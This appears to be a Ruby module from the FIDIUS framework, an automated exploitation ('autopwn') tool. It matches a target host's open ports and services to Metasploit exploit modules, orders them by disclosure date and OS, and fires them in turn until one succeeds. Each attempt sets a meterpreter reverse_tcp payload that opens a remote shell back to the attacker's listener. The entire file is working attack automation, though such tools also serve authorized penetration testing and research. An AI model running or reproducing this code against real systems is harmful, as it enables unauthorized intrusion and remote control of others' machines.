require "fidius-common"
require 'timeout'

module FIDIUS
  module Action
    module Exploit
      # An instance of this class represents an autopwn against one host.
      class Autopwner

        # timeout
        @@TIMEOUT = 30

        # Creates a autopwner object.
        # 
        # @param [Interface]  The interface to exploit.
        # @param [String]  The IP address the payload should reverse connect to.
        # @param [Integer]  The port the payload should reverse connect to.
        def initialize rhost, lhost = nil, lport = nil
          raise ArgumentError, "rhost must be of type Interface" unless rhost.is_a? FIDIUS::Asset::Interface
          @rhost = rhost
          @lhost = lhost
          @lport = lport
          @framework = FIDIUS::Action.msf_framework
          puts "[OK] load framework"
        end

        # Starts the exploitation process.
        #
        # @param [Hash] Hash with modules grouped by port
        # @param [Hash] Hash with modules grouped by service
        # @return [Msf::Session] A Session got for this exploit.
        def run_autopwn modules_by_port, modules_by_service
          modules = get_matching_modules_by_ports modules_by_port, modules_by_service
          modules = get_modules_ordered(modules)
          exploit_host_with_modules modules
        end

private

        # Runs an exploit against given +remote host port+ or +serivce+. If
        # +non_blocking+ is set to +true+ this method will return a thread
        # which has to be handled by caller. Otherwise the thread will be
        # joined after at least the amount of seconds which is set in
        # this class or if +timeout+ is given as parameter and not +nil+
        # the amount of seconds given by timeout parameter.
        #
        # DMKE: the last sentence does not parse...
        #
        # @param lhost Local host.
        # @param rhost Remote host.
        # @param rport Remote port.
        # @param rproto Protocol.
        # @param [String] modname Metasploits +module.fullname+
        # @param [Boolean] non_blocking +true+ if the exploit should run in
        #                  a new thread.
        # @param [Integer] timeout A timeout.
        # @return [Thread] If +non_blocking+ is set to +true+, this method
        #                  may return a running thread (which might be
        #                  already finished at the point of return). Otherwise,
        #                  after either the given +timeout+ or a local
        #                  +@@TIMEOUT+, a finished thread is returned.
        def run_exploit_against_host_at_port mod_name, rport, rproto, non_blocking = false, timeout = nil
          opts = {}
          opts['RHOST'] = @rhost.ip
          if (rport)
            opts['RPORT'] = rport.to_s
          end
          opts['LHOST'] = @lhost ? @lhost : (FIDIUS::Common.get_my_ip @rhost.ip)
          opts['LPORT'] = @lport ? @lport : (rand(0x8fff) + 4000).to_s
          if (opts['LHOST'] == '127.0.0.1')
            puts("Failed to determine listener address for target #{rhost}...")
            return
          end
          # TODO: win / linux 64bit und ipv6 support
          puts "[MODNAME]: #{mod_name}"
          if(mod_name =~ /\/windows\//)
            opts['PAYLOAD'] = 'windows/meterpreter/reverse_tcp'
          elsif(mod_name =~ /\/linux\// or mod_name =~ /\/unix\//)
            if @framework.modules[mod_name.sub('exploit/','')].new.arch.include? "cmd"
              puts "Handle cmd Types PAYLOAD"
              opts['PAYLOAD'] = 'linux/x86/meterpreter/reverse_tcp'
            else
              opts['PAYLOAD'] = 'linux/x86/meterpreter/reverse_tcp'
            end
          else
            puts "Handle generic payload"
          end
          
          begin
            time = Time.now.to_f
            Timeout::timeout(@@TIMEOUT) do
              if(mod_name =~ /exploit\//)
                puts "Running exploit #{mod_name}"
                return FIDIUS::Action::Msf.instance.run_exploit(mod_name, opts, false)
              elsif(mod_name =~ /auxiliary\//)
                puts "Running auxiliary #{mod_name}"
                return FIDIUS::Action::Msf.instance.run_auxiliary(mod_name, opts, false)
              else
                raise "unkown type of exploit #{mod_name}"
              end
            end
          rescue Timeout::Error
            puts("timeout from #{mod_name} after #{Time.now.to_f - time} seconds")
          rescue Exception
            puts("exception during launch from #{mod_name}: #{$!} ")
          end
        end

        def order_by_date modules
          return modules.sort do |a, b|
            date_of_a = a[1][:disclosure] ? a[1][:disclosure].to_s : Date.parse("01.01.1970").to_s
            date_of_b = b[1][:disclosure] ? b[1][:disclosure].to_s : Date.parse("01.01.1970").to_s
            if date_of_a == date_of_b then 0 elsif date_of_a <= date_of_b then 1 else -1 end
          end
        end

        # Orders modules_by_port modules of each host by disclosure date, respecting the
        # initially given +stealthiness+ level.
        # 
        # @param [Array?] A list of modules, sorted by port.
        # @return [Array?] The sorted list.
        def get_modules_ordered modules, remove_not_matching = true
          modules = order_by_date modules
          if remove_not_matching && @rhost.host.os_name
            exclude_osnames = []
            rhost_name = @rhost.host.os_name.downcase
            if rhost_name == "windows"
              exclude_osnames = ["linux", "unix", "osx"]
            elsif rhost_name == "osx" or rhost_name == "linux"
              exclude_osnames = ["windows"]
            end
            modules = modules.select { |s| 
              !exclude_osnames.include?(s[1][:platform].downcase) or s[1][:platform].size == 0
            }
          end
          modules
        end

        def get_matching_modules_by_ports modules_by_port, modules_by_service
          matches = {}
          @rhost.services.each do |serv|
            puts serv.interface
            next unless serv.interface
            # next if (serv.state != Msf::ServiceState::Open)
            xhost = @rhost.ip
            xport = serv.port.to_i
            xprot = serv.proto
            xname = serv.name
            next if xport == 0
            mods = modules_by_port[xport] || {}
            mods.each_key do |modname|
              opts = {}
              opts['RPORT'] = xport
              opts['RHOST'] = xhost
              matches[modname] ||= {}
              matches[modname] = matches[modname].merge(mods[modname])
              matches[modname] = matches[modname].merge({:xport => xport, :xprot => xprot, :opts => opts})
            end

            mods = modules_by_service[xname] || {}
            mods.each_key do |modname|
              opts = {}
              opts['RPORT'] = xport
              opts['RHOST'] = xhost
              matches[modname] ||= {}
              matches[modname] = matches[modname].merge(mods[modname])
              matches[modname] = matches[modname].merge({:xport => xport, :xprot => xprot, :opts => opts})
            end
          end
          puts "get_matching result"
          puts matches
          matches
        end

        # The original description of this method was:
        #
        #   host_list: hashmap[<host>][module instance][[<remote port>, <remote protocol>]]
        #   mod_order: hashmap[<host>] => Array of keys (module instance is used as keys)
        #
        # but I do not understand it...
        #
        # @param [Hash] host_list ?
        # @param [Hash] mod_order ?
        # @return [void]
        def exploit_host_with_modules mod_order
          mod_order.each do |modname, opts|
            session = run_exploit_against_host_at_port modname, opts[:xport], opts[:xprot]
            if session
              return session
            end
          end
        end

      end # class Exploit
    end # module Exploit
  end # module Action
end # module FIDIUS

